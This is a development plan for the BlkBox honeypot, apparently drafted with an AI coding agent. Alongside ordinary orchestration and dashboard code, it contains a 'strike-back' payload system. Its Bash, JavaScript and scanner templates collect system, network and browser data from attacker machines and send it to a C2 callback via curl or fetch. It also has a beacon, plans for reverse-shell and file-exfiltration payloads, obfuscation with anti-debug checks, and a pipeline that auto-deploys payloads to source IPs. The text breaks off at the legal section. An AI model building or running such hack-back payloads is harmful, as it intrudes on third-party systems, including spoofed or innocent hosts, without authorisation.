# BlkBox Honeypot: Phases 6-10 Implementation Plan

**Project**: BlkBox - Modern Honeypot with Strike-Back Capabilities
**Document Version**: 1.0
**Date**: 2025-12-24
**Status**: Planning Complete, Ready for Implementation

---

## Executive Summary

This document provides comprehensive implementation plans for Phases 6-10 of the BlkBox honeypot system. These phases build on the foundation established in Phases 1-5 (FFI infrastructure, HTTP/SSH honeypots, database honeypots, and tracking system) to add:

- **Phase 6**: Payload System (Cookiejar package)
- **Phase 7**: Strike-Back Capabilities (Stinger in Melittasphex)
- **Phase 8**: Integration & Main Application
- **Phase 9**: FTP/SFTP Honeypot
- **Phase 10**: Monitoring Dashboard & Analytics

**Current Project Status**:
- Rust Core: ~85% complete
- FFI Layer: ~90% complete
- TypeScript Packages: ~10% complete
- Database Schema: 100% complete
- Test Infrastructure: Functional

---

## Phase 6: Payload System (Cookiejar Package)

### Overview

The Cookiejar package implements a template-based payload generation system using a "bakery" metaphor:
- **Dough**: Raw payload templates and configuration
- **Oven**: Template processing and compilation
- **Bake**: Obfuscation and finalization
- **Jar**: Storage and serving

### Priority: MEDIUM-HIGH
### Estimated Duration: 1 week
### Dependencies: Storage system (complete), FFI layer (complete)

---

### 6.1 Architecture

```
Attack Event
     ↓
Stinger Decision (Phase 7)
     ↓
Cookiejar Pipeline:
     ↓
┌─────────────┐
│   Dough     │ ← Configuration input
│  (Config)   │   - Payload type selection
└──────┬──────┘   - Target environment
       │
       ↓
┌─────────────┐
│   Oven      │ ← Template library
│ (Templates) │   - JavaScript/Bash/PowerShell
└──────┬──────┘   - C2 callback integration
       │
       ↓
┌─────────────┐
│   Bake      │ ← Obfuscation engine
│(Obfuscation)│   - String encoding
└──────┬──────┘   - Control flow obfuscation
       │           - AES-256-GCM encryption
       ↓
┌─────────────┐
│    Jar      │ ← Payload serving
│  (Storage)  │   - Database storage
└─────────────┘   - HTTP delivery endpoints
       │           - Expiration management
       ↓
   Attacker
```

---

### 6.2 Payload Types

| Type | Risk | Purpose | Output Language |
|------|------|---------|----------------|
| **SystemInfo** | Low | System enumeration | Bash/PowerShell |
| **BrowserRecon** | Low | Browser fingerprinting | JavaScript |
| **NetworkScanner** | Medium | Network mapping | Python/Bash |
| **Beacon** | Low | Persistent tracking | JavaScript/Bash |
| **ReverseTCP** | High | Remote shell | Bash/PowerShell |
| **CommandInjection** | High | Exploit verification | Bash/Python |
| **FileExfiltration** | High | Document retrieval | JavaScript/Python |
| **LogWiper** | PROHIBITED | Never deploy | N/A |

---

### 6.3 Critical Files

#### 6.3.1 Dough (Configuration)

**File**: `/Users/ryanoboyle/blkbox/packages/cookiejar/dough/mod.ts`

```typescript
export interface DoughConfig {
  payloadType: PayloadType;
  targetEnvironment: {
    os?: "linux" | "windows" | "macos";
    shell?: "bash" | "powershell" | "cmd" | "python";
    hasInternet: boolean;
    detectLanguages: string[]; // Based on attack fingerprint
  };
  c2Config: {
    callbackUrl: string;
    payloadId: string;
    encryptionKey: string;
    maxCallbacks: number;
    expirationHours: number;
  };
  delivery: {
    method: "http_inject" | "ssh_output" | "db_result" | "ftp_file";
    context: Record<string, any>; // Attack-specific context
  };
  obfuscationLevel: "none" | "light" | "medium" | "heavy";
}

export class DoughService {
  static fromAttackEvent(
    event: AttackEvent,
    payloadType: PayloadType
  ): DoughConfig {
    return {
      payloadType,
      targetEnvironment: this.detectEnvironment(event),
      c2Config: this.generateC2Config(),
      delivery: this.selectDeliveryMethod(event),
      obfuscationLevel: "heavy"
    };
  }

  private static detectEnvironment(event: AttackEvent) {
    // Detect OS from User-Agent, SSH banner, etc.
    if (event.service_type === "SSH") {
      return { os: "linux", shell: "bash", hasInternet: true, detectLanguages: ["bash"] };
    } else if (event.service_type === "HTTP") {
      return { os: "unknown", shell: "bash", hasInternet: true, detectLanguages: ["javascript", "bash"] };
    }
    return { hasInternet: true, detectLanguages: ["bash"] };
  }
}
```

#### 6.3.2 Oven (Templates)

**File**: `/Users/ryanoboyle/blkbox/packages/cookiejar/oven/mod.ts`

```typescript
export class OvenTemplates {
  static readonly SYSTEM_INFO_BASH = `#!/bin/bash
# System Information Collector
C2_URL="{{C2_URL}}"
PAYLOAD_ID="{{PAYLOAD_ID}}"

# Collect system info
HOSTNAME=$(hostname)
OS=$(uname -a)
USER=$(whoami)
INTERFACES=$(ip addr show 2>/dev/null || ifconfig)
PROCESSES=$(ps aux | head -20)

# Build JSON payload
DATA=$(cat <<EOF
{
  "payload_id": "$PAYLOAD_ID",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "hostname": "$HOSTNAME",
  "os": "$OS",
  "user": "$USER",
  "network": $(echo "$INTERFACES" | base64 -w0),
  "processes": $(echo "$PROCESSES" | base64 -w0)
}
EOF
)

# Send to C2
curl -X POST "$C2_URL/c2/callback/$PAYLOAD_ID" \\
  -H "Content-Type: application/json" \\
  -d "$DATA" \\
  --silent --max-time 10 || wget -qO- --post-data="$DATA" "$C2_URL/c2/callback/$PAYLOAD_ID"
`;

  static readonly BROWSER_RECON_JS = `(function() {
  const C2_URL = "{{C2_URL}}";
  const PAYLOAD_ID = "{{PAYLOAD_ID}}";

  const data = {
    payload_id: PAYLOAD_ID,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    plugins: Array.from(navigator.plugins).map(p => p.name),
    webgl: getWebGLInfo(),
    canvas: getCanvasFingerprint()
  };

  function getWebGLInfo() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      return {
        vendor: gl.getParameter(gl.VENDOR),
        renderer: gl.getParameter(gl.RENDERER)
      };
    } catch(e) { return null; }
  }

  function getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText('BlkBox', 2, 2);
      return canvas.toDataURL();
    } catch(e) { return null; }
  }

  fetch(C2_URL + '/c2/callback/' + PAYLOAD_ID, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).catch(() => {});
})();`;

  static readonly NETWORK_SCANNER_BASH = `#!/bin/bash
C2_URL="{{C2_URL}}"
PAYLOAD_ID="{{PAYLOAD_ID}}"

# Get local network
LOCAL_NET=$(ip route | grep -Eo '192\\.168\\.[0-9]+\\.' | head -1)

# Quick scan
RESULTS=""
for i in {1..254}; do
  IP="${LOCAL_NET}$i"
  ping -c 1 -W 1 $IP &>/dev/null && RESULTS="$RESULTS $IP"
done

# Send results
DATA='{"payload_id":"'$PAYLOAD_ID'","scan_results":"'$(echo $RESULTS | base64 -w0)'"}'
curl -X POST "$C2_URL/c2/callback/$PAYLOAD_ID" -d "$DATA" --silent
`;

  static readonly BEACON_JS = `(function() {
  const C2 = "{{C2_URL}}/c2/heartbeat/{{PAYLOAD_ID}}";
  setInterval(() => {
    fetch(C2, { method: 'POST', body: JSON.stringify({ ts: Date.now() }) }).catch(() => {});
  }, 60000); // Every 60 seconds
})();`;

  static getTemplate(type: PayloadType, language: string): string {
    const key = `${type.toUpperCase()}_${language.toUpperCase()}`;
    return this[key] || this.SYSTEM_INFO_BASH;
  }
}
```

#### 6.3.3 Bake (Obfuscation)

**File**: `/Users/ryanoboyle/blkbox/packages/cookiejar/bake/mod.ts`

```typescript
export class BakeService {
  static obfuscate(
    template: string,
    config: DoughConfig
  ): string {
    let code = this.substituteVariables(template, config);

    switch (config.obfuscationLevel) {
      case "heavy":
        code = this.encodeStrings(code);
        code = this.obfuscateControlFlow(code);
        code = this.addAntiDebug(code);
        break;
      case "medium":
        code = this.encodeStrings(code);
        code = this.addJunk(code);
        break;
      case "light":
        code = this.encodeStrings(code);
        break;
    }

    return code;
  }

  private static substituteVariables(template: string, config: DoughConfig): string {
    return template
      .replace(/\{\{C2_URL\}\}/g, config.c2Config.callbackUrl)
      .replace(/\{\{PAYLOAD_ID\}\}/g, config.c2Config.payloadId)
      .replace(/\{\{ENCRYPTION_KEY\}\}/g, config.c2Config.encryptionKey);
  }

  private static encodeStrings(code: string): string {
    // Base64 encode sensitive strings
    const sensitivePatterns = [
      /C2_URL="([^"]+)"/g,
      /curl.*-X POST/g
    ];

    sensitivePatterns.forEach(pattern => {
      code = code.replace(pattern, (match) => {
        return `$(echo "${btoa(match)}" | base64 -d)`;
      });
    });

    return code;
  }

  private static obfuscateControlFlow(code: string): string {
    // Add dead code branches
    const junk = `
    if [ $(( RANDOM % 2 )) -eq 0 ]; then
      : # Intentional no-op
    fi
    `;
    return code + junk;
  }

  private static addAntiDebug(code: string): string {
    // Detect debugging/analysis
    const antiDebug = `
    # Anti-debug check
    if [ -n "$DEBUGGER" ] || [ -n "$STRACE_PID" ]; then
      exit 0
    fi
    `;
    return antiDebug + code;
  }

  private static addJunk(code: string): string {
    // Add random comments and whitespace
    return code.split('\n').map(line => {
      if (Math.random() > 0.7) {
        return `# ${Math.random().toString(36)}\n${line}`;
      }
      return line;
    }).join('\n');
  }

  static encrypt(code: string, key: string): string {
    // AES-256-GCM encryption
    const crypto = globalThis.crypto.subtle;
    // Implementation would use Web Crypto API or Deno's crypto
    return code; // Simplified for planning
  }
}
```

#### 6.3.4 Jar (Storage & Serving)

**File**: `/Users/ryanoboyle/blkbox/packages/cookiejar/jar/mod.ts`

```typescript
export class JarService {
  constructor(private ffi: BlkBoxFFI) {}

  async storePayload(
    payloadId: string,
    code: string,
    config: DoughConfig
  ): Promise<void> {
    const expiresAt = new Date();
    expiresAt.setHours(expiresAt.getHours() + config.c2Config.expirationHours);

    // Store in database via FFI
    await this.ffi.storePayload({
      payload_id: payloadId,
      payload_type: config.payloadType,
      payload_code: code,
      target_ip: config.delivery.context.attackerIp,
      created_at: new Date().toISOString(),
      expires_at: expiresAt.toISOString(),
      status: "ready",
      delivery_method: config.delivery.method
    });
  }

  async servePayload(payloadId: string): Promise<string | null> {
    const payload = await this.ffi.getPayload(payloadId);

    if (!payload) return null;

    // Check expiration
    if (new Date(payload.expires_at) < new Date()) {
      await this.ffi.updatePayloadStatus(payloadId, "expired");
      return null;
    }

    // Mark as delivered
    await this.ffi.updatePayloadStatus(payloadId, "delivered");
    await this.ffi.incrementPayloadDeliveryCount(payloadId);

    return payload.payload_code;
  }

  async cleanupExpired(): Promise<number> {
    // Remove expired payloads
    return await this.ffi.deleteExpiredPayloads();
  }
}
```

---

### 6.4 Database Schema Enhancements

**Migration**: Add payloads table details

```sql
CREATE TABLE IF NOT EXISTS payloads (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    payload_id TEXT UNIQUE NOT NULL,
    payload_type TEXT NOT NULL,
    payload_code TEXT NOT NULL,
    target_ip TEXT NOT NULL,
    attack_id INTEGER,
    created_at TEXT NOT NULL,
    expires_at TEXT NOT NULL,
    delivered_at TEXT,
    delivery_count INTEGER DEFAULT 0,
    status TEXT NOT NULL, -- 'ready', 'delivered', 'active', 'expired', 'terminated'
    delivery_method TEXT,
    c2_callback_count INTEGER DEFAULT 0,
    last_callback_at TEXT,
    metadata TEXT,

    FOREIGN KEY(attack_id) REFERENCES attacks(id)
);

CREATE INDEX idx_payloads_id ON payloads(payload_id);
CREATE INDEX idx_payloads_target ON payloads(target_ip);
CREATE INDEX idx_payloads_status ON payloads(status);
CREATE INDEX idx_payloads_expires ON payloads(expires_at);
```

---

### 6.5 Success Criteria

- [ ] Payload templates for all 8 payload types created
- [ ] Dough service can generate configurations from attack events
- [ ] Oven service retrieves and processes templates
- [ ] Bake service obfuscates code at 3 levels
- [ ] Jar service stores and serves payloads
- [ ] Payloads auto-expire after configured hours
- [ ] Database schema supports payload lifecycle
- [ ] Integration tests pass for full pipeline

---

## Phase 7: Strike-Back Capabilities (Stinger)

### Overview

Implements offensive/defensive capabilities for deploying reconnaissance payloads to confirmed attackers. Includes comprehensive safeguards, threat assessment, and C2 infrastructure.

### Priority: MEDIUM-HIGH
### Estimated Duration: 3 weeks
### Dependencies: Phase 5 (Tracking), Phase 6 (Cookiejar)

See detailed plan in agent output above (a60d440) for:
- Threat assessment decision engine
- Safeguard enforcement (whitelisting, geofencing, legal compliance)
- C2 infrastructure
- Deployment mechanisms
- Audit logging
- Legal/ethical guidelines

### Critical Files:
1. `/Users/ryanoboyle/blkbox/lib_rust/strikeback/mod.rs`
2. `/Users/ryanoboyle/blkbox/lib_rust/strikeback/decision.rs`
3. `/Users/ryanoboyle/blkbox/lib_rust/strikeback/payload.rs`
4. `/Users/ryanoboyle/blkbox/lib_rust/strikeback/c2.rs`
5. `/Users/ryanoboyle/blkbox/lib_rust/strikeback/delivery.rs`
6. `/Users/ryanoboyle/blkbox/packages/melittasphex/stinger/stinger_service.ts`

---

## Phase 8: Integration & Main Application

### Overview

Ties all packages together with a main orchestrator, configuration management, and event pipeline.

### Priority: HIGH
### Estimated Duration: 1 week
### Dependencies: All previous phases

---

### 8.1 Configuration System

**File**: `/Users/ryanoboyle/blkbox/blkbox/config/config.ts`

```typescript
export interface BlkBoxConfiguration {
  honeypots: HoneypotConfig[];

  cloudflare?: {
    enabled: boolean;
    apiKey: string;
    zoneId: string;
    updateFirewall: boolean;
    threatThreshold: number;
  };

  storage: {
    database: string;
    retentionDays: number;
    backupInterval: number;
    geoipDatabase?: string;
  };

  stinger: {
    enabled: boolean;
    autoTrigger: boolean;
    threatThreshold: number;
    allowedPayloads: string[];
    requireApproval: boolean;
    dryRun: boolean;
    c2Server?: string;
  };

  tracking: {
    geoip: boolean;
    fingerprinting: boolean;
    sessionCorrelation: boolean;
    sessionTimeout: number;
  };

  logging: {
    level: "debug" | "info" | "warn" | "error";
    file?: string;
    console: boolean;
  };

  server: {
    managementPort: number;
    enableDashboard: boolean;
  };
}

export async function loadConfig(path = "./config.json"): Promise<BlkBoxConfiguration> {
  const content = await Deno.readTextFile(path);
  const config = JSON.parse(content);
  validateConfig(config);
  return config;
}
```

**File**: `/Users/ryanoboyle/blkbox/config.json`

```json
{
  "honeypots": [
    {
      "type": "http",
      "port": 8080,
      "enabled": true,
      "options": {
        "fakeApps": ["wordpress", "phpmyadmin"]
      }
    },
    {
      "type": "ssh",
      "port": 2222,
      "enabled": true,
      "options": {
        "banner": "SSH-2.0-OpenSSH_9.0"
      }
    },
    {
      "type": "ftp",
      "port": 21,
      "enabled": false
    }
  ],

  "storage": {
    "database": "./blkbox.db",
    "retentionDays": 365,
    "backupInterval": 86400
  },

  "stinger": {
    "enabled": false,
    "autoTrigger": false,
    "threatThreshold": 7.5,
    "allowedPayloads": ["system_info", "browser_recon"],
    "requireApproval": true,
    "dryRun": true
  },

  "tracking": {
    "geoip": true,
    "fingerprinting": true,
    "sessionCorrelation": true,
    "sessionTimeout": 3600
  },

  "logging": {
    "level": "info",
    "console": true
  },

  "server": {
    "managementPort": 9000,
    "enableDashboard": true
  }
}
```

---

### 8.2 Main Application Entry Point

**File**: `/Users/ryanoboyle/blkbox/main.ts`

```typescript
import { BlkBoxFFI } from "./lib_deno/lib.ts";
import { loadConfig, BlkBoxConfiguration } from "./blkbox/config/config.ts";
import { HoneypotService } from "./packages/melittasphex/hive/honeypot_service.ts";
import { StingerService } from "./packages/melittasphex/stinger/stinger_service.ts";
import { TrackasuarusService } from "./packages/trackasuarus/server.ts";
import { CookiejarService } from "./packages/cookiejar/server.ts";
import { EventPipeline } from "./blkbox/server/event-pipeline.ts";
import { ManagementServer } from "./blkbox/server/server.ts";

class BlkBoxOrchestrator {
  private config!: BlkBoxConfiguration;
  private ffi!: BlkBoxFFI;
  private honeypotService!: HoneypotService;
  private stingerService!: StingerService;
  private trackerService!: TrackasuarusService;
  private cookiejarService!: CookiejarService;
  private eventPipeline!: EventPipeline;
  private managementServer?: ManagementServer;
  private running = false;

  async start(): Promise<void> {
    console.log("🐝 BlkBox Honeypot System");
    console.log("========================\n");

    // Load configuration
    console.log("Loading configuration...");
    this.config = await loadConfig();

    // Initialize FFI
    console.log("Initializing FFI runtime...");
    this.ffi = new BlkBoxFFI();

    // Initialize services
    console.log("Initializing services...");
    this.honeypotService = new HoneypotService(this.ffi, this.config);
    this.stingerService = new StingerService(this.ffi, this.config);
    this.trackerService = new TrackasuarusService(this.ffi);
    this.cookiejarService = new CookiejarService(this.ffi);

    // Setup event pipeline
    console.log("Setting up event pipeline...");
    this.eventPipeline = new EventPipeline(
      this.trackerService,
      this.cookiejarService,
      this.stingerService
    );

    // Start honeypots
    console.log("Starting honeypots...");
    for (const honeypot of this.config.honeypots) {
      if (honeypot.enabled) {
        await this.honeypotService.startHoneypot(honeypot);
        console.log(`  ✓ ${honeypot.type.toUpperCase()} on port ${honeypot.port}`);
      }
    }

    // Start management server
    if (this.config.server.enableDashboard) {
      console.log("Starting management server...");
      this.managementServer = new ManagementServer(
        this.config.server.managementPort,
        this.ffi
      );
      await this.managementServer.start();
      console.log(`  ✓ Dashboard: http://localhost:${this.config.server.managementPort}`);
    }

    // Setup signal handlers
    this.setupShutdownHandlers();

    console.log("\n✓ BlkBox is running");
    console.log("Press Ctrl+C to shutdown gracefully\n");

    // Enter event processing loop
    this.running = true;
    await this.processEvents();
  }

  private async processEvents(): Promise<void> {
    while (this.running) {
      try {
        const events = this.ffi.getEvents();

        for (const event of events) {
          await this.eventPipeline.process(event);
        }

        await new Promise(resolve => setTimeout(resolve, 100));
      } catch (error) {
        console.error("Event processing error:", error);
      }
    }
  }

  async stop(): Promise<void> {
    console.log("\nShutting down BlkBox...");
    this.running = false;

    console.log("Stopping honeypots...");
    await this.honeypotService.stopAll();

    if (this.managementServer) {
      console.log("Stopping management server...");
      await this.managementServer.stop();
    }

    console.log("Closing FFI runtime...");
    this.ffi.close();

    console.log("✓ Shutdown complete");
    Deno.exit(0);
  }

  private setupShutdownHandlers(): void {
    Deno.addSignalListener("SIGINT", () => this.stop());
    Deno.addSignalListener("SIGTERM", () => this.stop());
  }
}

// Main entry point
if (import.meta.main) {
  const orchestrator = new BlkBoxOrchestrator();
  await orchestrator.start();
}
```

---

### 8.3 Event Pipeline

**File**: `/Users/ryanoboyle/blkbox/blkbox/server/event-pipeline.ts`

```typescript
import type { AttackEvent } from "../lib_deno/types.ts";

interface EventProcessor {
  name: string;
  process(event: AttackEvent, context: EventContext): Promise<EventContext>;
}

interface EventContext {
  event: AttackEvent;
  tracking?: TrackingResult;
  decision?: StrikebackDecision;
  actions: string[];
}

export class EventPipeline {
  private processors: EventProcessor[] = [];

  constructor(
    private tracker: TrackasuarusService,
    private cookiejar: CookiejarService,
    private stinger: StingerService
  ) {
    this.addProcessor(new TrackingProcessor(tracker));
    this.addProcessor(new DecisionProcessor(stinger));
    this.addProcessor(new ActionProcessor(cookiejar, stinger));
  }

  addProcessor(processor: EventProcessor): void {
    this.processors.push(processor);
  }

  async process(event: AttackEvent): Promise<void> {
    let context: EventContext = {
      event,
      actions: []
    };

    for (const processor of this.processors) {
      try {
        context = await processor.process(event, context);
      } catch (error) {
        console.error(`Processor ${processor.name} failed:`, error);
      }
    }
  }
}

class TrackingProcessor implements EventProcessor {
  name = "tracking";

  constructor(private tracker: TrackasuarusService) {}

  async process(event: AttackEvent, context: EventContext): Promise<EventContext> {
    const tracking = await this.tracker.trackAttack(event);
    return { ...context, tracking };
  }
}

class DecisionProcessor implements EventProcessor {
  name = "decision";

  constructor(private stinger: StingerService) {}

  async process(event: AttackEvent, context: EventContext): Promise<EventContext> {
    if (!context.tracking) return context;

    const decision = await this.stinger.evaluateThreat(event, context.tracking);
    return { ...context, decision };
  }
}

class ActionProcessor implements EventProcessor {
  name = "action";

  constructor(
    private cookiejar: CookiejarService,
    private stinger: StingerService
  ) {}

  async process(event: AttackEvent, context: EventContext): Promise<EventContext> {
    if (!context.decision) return context;

    if (context.decision.shouldStrikeback) {
      await this.stinger.deployPayload(
        event.source_ip,
        context.decision.payloadType
      );
      context.actions.push("strikeback_deployed");
    }

    return context;
  }
}
```

---

## Phase 9: FTP/SFTP Honeypot

### Overview

Implements FTP protocol honeypot with fake filesystem and file upload quarantine.

### Priority: MEDIUM
### Estimated Duration: 3 days
### Dependencies: Phase 8 (Integration)

---

### 9.1 FTP Protocol Implementation

**File**: `/Users/ryanoboyle/blkbox/lib_rust/honeypot/ftp.rs`

Key features:
- Full FTP command support (USER, PASS, LIST, RETR, STOR, etc.)
- Passive and active mode transfers
- Virtual filesystem
- Upload quarantine with malware detection
- Session tracking and fingerprinting

See Phase 8-9 agent output for full implementation details.

---

## Phase 10: Monitoring Dashboard & Analytics

### Overview

Web-based dashboard for real-time monitoring, analytics, and threat intelligence visualization.

### Priority: MEDIUM
### Estimated Duration: 1 week
### Dependencies: Phase 8 (Integration)

---

### 10.1 Dashboard Architecture

```
┌─────────────────────────────────────────────────┐
│         Web Dashboard (Fresh Framework)         │
│  - Real-time attack feed (Server-Sent Events)  │
│  - Analytics charts (Chart.js)                  │
│  - Geographic map (Leaflet)                     │
│  - Attacker profiles                            │
│  - Export functionality                         │
└─────────────────────────────────────────────────┘
                     ↓
         ┌───────────┴───────────┐
         ▼                       ▼
┌──────────────────┐    ┌──────────────────┐
│  Management API  │    │  SQLite Database │
│  (Deno HTTP)     │    │  (via FFI)       │
└──────────────────┘    └──────────────────┘
```

---

### 10.2 Key Features

1. **Real-Time Attack Feed**
   - Live event stream using Server-Sent Events (SSE)
   - Attack details with threat scores
   - Automatic refresh

2. **Analytics Dashboard**
   - Total attacks counter
   - Attacks by protocol (HTTP, SSH, FTP)
   - Top attacker IPs
   - Geographic distribution
   - Threat score distribution
   - Attack timeline (hourly/daily)

3. **Attacker Profiles**
   - IP address details
   - Geolocation on map
   - Attack history
   - Session correlation
   - Fingerprints collected
   - Threat progression

4. **Export Functionality**
   - JSON export of attack data
   - CSV export for spreadsheets
   - PCAP export for network analysis
   - PDF reports

5. **Alert Management**
   - Configurable alert thresholds
   - Email notifications
   - Webhook integration
   - Slack/Discord notifications

---

### 10.3 Critical Files

#### 10.3.1 Management Server

**File**: `/Users/ryanoboyle/blkbox/blkbox/server/server.ts`

```typescript
import { serve } from "https://deno.land/std@0.208.0/http/server.ts";
import type { BlkBoxFFI } from "../../lib_deno/lib.ts";

export class ManagementServer {
  private server?: Deno.HttpServer;

  constructor(
    private port: number,
    private ffi: BlkBoxFFI
  ) {}

  async start(): Promise<void> {
    this.server = serve(this.handler.bind(this), { port: this.port });
  }

  async stop(): Promise<void> {
    await this.server?.shutdown();
  }

  private async handler(req: Request): Promise<Response> {
    const url = new URL(req.url);

    // API Routes
    if (url.pathname === "/api/status") {
      return this.handleStatus();
    } else if (url.pathname === "/api/attacks") {
      return this.handleAttacks(url);
    } else if (url.pathname === "/api/attacks/stream") {
      return this.handleAttackStream();
    } else if (url.pathname === "/api/threats/top") {
      return this.handleTopThreats();
    } else if (url.pathname === "/api/export/json") {
      return this.handleExportJSON(url);
    } else if (url.pathname.startsWith("/api/")) {
      return new Response("Not Found", { status: 404 });
    }

    // Static dashboard
    return this.handleStatic(url.pathname);
  }

  private async handleStatus(): Promise<Response> {
    const stats = this.ffi.getSystemStats();
    return new Response(JSON.stringify(stats), {
      headers: { "Content-Type": "application/json" }
    });
  }

  private async handleAttacks(url: URL): Promise<Response> {
    const limit = parseInt(url.searchParams.get("limit") || "100");
    const offset = parseInt(url.searchParams.get("offset") || "0");

    const attacks = this.ffi.getRecentAttacks(limit, offset);
    return new Response(JSON.stringify(attacks), {
      headers: { "Content-Type": "application/json" }
    });
  }

  private async handleAttackStream(): Promise<Response> {
    const stream = new ReadableStream({
      start: async (controller) => {
        const encoder = new TextEncoder();

        while (true) {
          const events = this.ffi.getEvents();
          for (const event of events) {
            controller.enqueue(encoder.encode(`data: ${JSON.stringify(event)}\n\n`));
          }
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
    });

    return new Response(stream, {
      headers: {
        "Content-Type": "text/event-stream",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive"
      }
    });
  }

  private async handleTopThreats(): Promise<Response> {
    const threats = this.ffi.getTopThreats(10);
    return new Response(JSON.stringify(threats), {
      headers: { "Content-Type": "application/json" }
    });
  }

  private async handleExportJSON(url: URL): Promise<Response> {
    const since = url.searchParams.get("since") || "";
    const attacks = this.ffi.getAttacksSince(since);

    return new Response(JSON.stringify(attacks, null, 2), {
      headers: {
        "Content-Type": "application/json",
        "Content-Disposition": `attachment; filename="blkbox-export-${Date.now()}.json"`
      }
    });
  }

  private async handleStatic(pathname: string): Promise<Response> {
    // Serve static dashboard HTML/JS/CSS
    if (pathname === "/" || pathname === "/dashboard") {
      return new Response(DASHBOARD_HTML, {
        headers: { "Content-Type": "text/html" }
      });
    }
    return new Response("Not Found", { status: 404 });
  }
}

const DASHBOARD_HTML = `<!DOCTYPE html>
<html>
<head>
  <title>BlkBox Dashboard</title>
  <meta charset="utf-8">
  <style>
    body { font-family: system-ui; margin: 0; padding: 20px; background: #0a0a0a; color: #fff; }
    h1 { margin: 0 0 20px 0; }
    .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px; }
    .stat-card { background: #1a1a1a; padding: 20px; border-radius: 8px; border: 1px solid #333; }
    .stat-value { font-size: 2em; font-weight: bold; color: #ff6b6b; }
    .stat-label { color: #888; margin-top: 5px; }
    .attacks { background: #1a1a1a; padding: 20px; border-radius: 8px; border: 1px solid #333; }
    .attack { padding: 10px; border-bottom: 1px solid #333; }
    .attack:hover { background: #222; }
    .threat-high { color: #ff6b6b; }
    .threat-medium { color: #ffa500; }
    .threat-low { color: #4caf50; }
  </style>
</head>
<body>
  <h1>🐝 BlkBox Honeypot Dashboard</h1>

  <div class="stats">
    <div class="stat-card">
      <div class="stat-value" id="total-attacks">0</div>
      <div class="stat-label">Total Attacks</div>
    </div>
    <div class="stat-card">
      <div class="stat-value" id="http-attacks">0</div>
      <div class="stat-label">HTTP Attacks</div>
    </div>
    <div class="stat-card">
      <div class="stat-value" id="ssh-attacks">0</div>
      <div class="stat-label">SSH Attacks</div>
    </div>
    <div class="stat-card">
      <div class="stat-value" id="unique-ips">0</div>
      <div class="stat-label">Unique IPs</div>
    </div>
  </div>

  <div class="attacks">
    <h2>Recent Attacks</h2>
    <div id="attack-feed"></div>
  </div>

  <script>
    const eventSource = new EventSource('/api/attacks/stream');
    const feed = document.getElementById('attack-feed');
    let attackCount = 0;
    let httpCount = 0;
    let sshCount = 0;
    const uniqueIPs = new Set();

    eventSource.onmessage = (e) => {
      const event = JSON.parse(e.data);

      attackCount++;
      uniqueIPs.add(event.source_ip);
      if (event.service_type === 'HTTP') httpCount++;
      if (event.service_type === 'SSH') sshCount++;

      document.getElementById('total-attacks').textContent = attackCount;
      document.getElementById('http-attacks').textContent = httpCount;
      document.getElementById('ssh-attacks').textContent = sshCount;
      document.getElementById('unique-ips').textContent = uniqueIPs.size;

      const threatClass = event.threat_level >= 7 ? 'threat-high' : event.threat_level >= 4 ? 'threat-medium' : 'threat-low';

      const div = document.createElement('div');
      div.className = 'attack';
      div.innerHTML = \`
        <strong class="\${threatClass}">\${event.service_type}</strong> from
        <strong>\${event.source_ip}:\${event.source_port}</strong> -
        Threat: <span class="\${threatClass}">\${event.threat_level}/10</span> -
        \${new Date(event.timestamp).toLocaleTimeString()}
      \`;

      feed.insertBefore(div, feed.firstChild);
      if (feed.children.length > 50) feed.lastChild?.remove();
    };
  </script>
</body>
</html>`;
```

---

### 10.4 Success Criteria

- [ ] Dashboard accessible via HTTP
- [ ] Real-time attack feed updates
- [ ] Statistics display correctly
- [ ] Attack export works (JSON, CSV)
- [ ] Geographic map shows attack origins
- [ ] Responsive design works on mobile
- [ ] API endpoints secured with authentication

---

## Implementation Timeline

### Week 1: Phase 6 (Cookiejar)
- Days 1-2: Dough and Oven implementation
- Days 3-4: Bake obfuscation engine
- Days 5-7: Jar storage and integration testing

### Week 2: Phase 7A-B (Stinger Foundation)
- Days 1-3: Decision engine and safeguards
- Days 4-7: Payload generation (Cookiejar integration)

### Week 3: Phase 7C-D (Stinger Delivery & C2)
- Days 1-3: Delivery mechanisms
- Days 4-7: C2 infrastructure

### Week 4: Phase 7E-F + Phase 8 (Integration)
- Days 1-2: Stinger integration
- Days 3-4: Configuration and main application
- Days 5-7: Event pipeline and testing

### Week 5: Phase 9 + Phase 10 (FTP & Dashboard)
- Days 1-3: FTP honeypot
- Days 4-7: Dashboard and analytics

---

## Testing Strategy

### Unit Tests
- Each module (Dough, Oven, Bake, Jar) independently
- Threat scoring algorithm
- Safeguard checks
- Payload obfuscation
- FTP protocol handlers

### Integration Tests
- Full Cookiejar pipeline
- Event pipeline end-to-end
- Stinger deployment flow
- Dashboard API endpoints

### Security Tests
- Payload detection resistance
- C2 authentication
- Safeguard bypass attempts
- SQL injection in dashboard

### Load Tests
- High attack volume handling
- Event pipeline backpressure
- Dashboard concurrent users
- Database query performance

---

## Success Metrics

### Phase 6 Complete:
- [ ] 8 payload types with templates
- [ ] Obfuscation working at 3 levels
- [ ] Payloads stored and served correctly
- [ ] Auto-expiration functional

### Phase 7 Complete:
- [ ] Threat assessment operational
- [ ] Safeguards enforced
- [ ] C2 receiving callbacks
- [ ] Audit logging complete

### Phase 8 Complete:
- [ ] All services start correctly
- [ ] Event pipeline processes attacks
- [ ] Configuration system working
- [ ] Graceful shutdown tested

### Phase 9 Complete:
- [ ] FTP accepts connections
- [ ] File uploads quarantined
- [ ] Fingerprinting operational

### Phase 10 Complete:
- [ ] Dashboard displays real-time data
- [ ] Exports working
- [ ] Analytics accurate

---

## Legal & Compliance

**CRITICAL**: Before deploying strike-back capabilities (Phase 7):

